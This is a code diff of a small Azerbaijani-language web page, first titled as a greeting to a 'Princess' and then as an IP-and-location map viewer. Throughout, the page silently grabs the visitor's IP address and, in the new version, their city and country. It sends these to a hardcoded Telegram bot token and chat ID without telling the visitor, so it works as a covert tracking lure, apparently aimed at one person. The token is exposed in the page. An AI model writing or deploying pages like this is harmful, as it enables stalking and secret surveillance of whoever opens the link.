@@ -2,32 +2,49 @@
 <html lang="az">
 <head>
   <meta charset="UTF-8" />
-  <title>Salam Prenses</title>
+  <title>IP və Yeri Xəritədə Göstər</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 100px;
+      margin-top: 50px;
       background: #f0f0f0;
       color: #333;
     }
     #ipDisplay {
-      font-size: 30px;
-      margin-top: 40px;
+      font-size: 22px;
+      margin-bottom: 20px;
       font-weight: bold;
     }
+    #map {
+      height: 400px;
+      max-width: 90%;
+      margin: 0 auto;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
   </style>
+
+  <!-- Leaflet CSS -->
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+  />
 </head>
 <body>
-  <h1>Prenses:</h1>
+  <h1>IP və Yeriniz</h1>
   <div id="ipDisplay">Loading...</div>
+  <div id="map"></div>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
   <script>
     const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
     const chatId = '1689497109';
 
-    async function sendIpToTelegram(ip) {
-      const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}`);
+    async function sendIpToTelegram(text) {
+      const message = encodeURIComponent(text);
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
 
       try {
@@ -40,22 +57,47 @@
       }
     }
 
-    async function getIpAndSend() {
+    async function getIpGeo() {
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        const ip = data.ip;
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
 
-        document.getElementById('ipDisplay').textContent = ip;
-        sendIpToTelegram(ip);
-      } catch (error) {
-        document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
-        console.error('IP alınarkən xəta:', error);
+        const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+        const geoData = await geoRes.json();
+
+        if (geoData.status === 'success') {
+          return geoData;
+        } else {
+          throw new Error('Geo məlumat alınmadı');
+        }
+      } catch (e) {
+        console.error(e);
+        return null;
       }
     }
 
-    window.onload = () => {
-      getIpAndSend();
+    window.onload = async () => {
+      const geo = await getIpGeo();
+      if (!geo) {
+        document.getElementById('ipDisplay').textContent = 'Geo məlumat alınmadı';
+        return;
+      }
+
+      document.getElementById('ipDisplay').textContent = `IP: ${geo.query}, Yer: ${geo.city}, ${geo.country}`;
+
+      sendIpToTelegram(`IP: ${geo.query}, Yer: ${geo.city}, ${geo.country}`);
+
+      const map = L.map('map').setView([geo.lat, geo.lon], 13);
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap',
+      }).addTo(map);
+
+      L.marker([geo.lat, geo.lon])
+        .addTo(map)
+        .bindPopup(`${geo.city}, ${geo.country}`)
+        .openPopup();
     };
   </script>
 </body>
